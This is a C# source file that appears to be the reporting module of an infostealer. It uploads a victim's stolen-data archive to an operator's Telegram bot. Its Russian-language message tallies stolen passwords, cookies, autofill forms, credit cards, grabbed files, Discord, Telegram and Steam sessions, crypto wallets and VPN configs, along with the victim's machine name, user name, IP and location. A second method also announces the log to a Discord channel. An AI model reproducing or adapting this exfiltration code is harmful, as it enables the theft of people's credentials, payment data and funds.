using System;
using exos;
using exos.utils;

namespace TelegramAPI;

public class Telegram
{
	private static string TelegramToken = Calc.returnToken();

	private static string ChatId = Calc.returnid();

	public static void TelegramAPI(string filePath)
	{
		new Bot(TelegramToken, ChatId).SendFile(filePath, "✅ Новый лог в панели! - " + Environment.MachineName + " " + Environment.UserName + "\n ================================\n \ud83c\udfae - " + SystemInfo.GetSystemVersion() + "\n \ud83d\udcb8 Воркер - " + DiscordWebhook.worker + "\n ⚙ Виртуалка - " + MainMenu.checkvm() + "\n \ud83c\udf10 IP - " + MainMenu.GetLocalIPAddress() + "\n \ud83c\udf10 GEO - [" + GeoGet.Geo() + "]\n ================================\n \ud83d\udd10 Пароли - " + Counting.Passwords + "\n \ud83c\udf6a Куки - " + Counting.Cookies + "\n ✉\ufe0f Формы - " + Counting.AutoFill + "\n \ud83d\udcb3 Карты - " + Counting.CreditCards + "\n \ud83d\udcc1 Файлы - " + Counting.FileGrabber + ((Counting.Discord > 0) ? "\n \ud83c\udf0c Дискорд" : "") + ((Counting.Wallets > 0) ? "\n \ud83e\uddca Холодки" : "") + ((Counting.Telegram > 0) ? "\n \ud83d\udca7 Телеграмм" : "") + ((Counting.Steam > 0) ? "\n \ud83d\udd25 Стим" : "") + "\n ================================" + ((Counting.NordVPN > 0) ? "\n   NordVPN" : "") + ((Counting.OpenVPN > 0) ? "\n   OpenVPN" : "") + ((Counting.ProtonVPN > 0) ? "\n   ProtonVPN" : "") + "\n ================================\n " + URLSearcher.GetDomainDetect(Helper.ExploitDir + "\\Browsers\\"));
	}

	public static void messagelog()
	{
		new Bot(TelegramToken, ChatId).SendMessage("✅ Новый лог уже в дискорде | Информация: " + Environment.MachineName + " " + Environment.UserName);
	}
}
